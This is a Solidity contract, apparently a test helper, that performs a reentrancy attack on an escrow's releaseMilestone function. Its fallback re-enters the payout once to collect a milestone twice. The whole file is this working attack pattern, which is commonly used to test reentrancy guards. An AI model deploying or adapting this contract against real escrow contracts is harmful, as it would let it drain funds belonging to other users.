// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IEscrow {
    function releaseMilestone(bytes32 id) external;
}

contract ReentrancyAttacker {
    IEscrow esc;
    bytes32 id;
    bool attacked;

    constructor(address _esc) {
        esc = IEscrow(_esc);
    }

    function set(bytes32 _id) external {
        id = _id;
    }

    fallback() external {
        if (!attacked) {
            attacked = true;
            esc.releaseMilestone(id);
        }
    }

    function attack() external {
        esc.releaseMilestone(id);
    }
}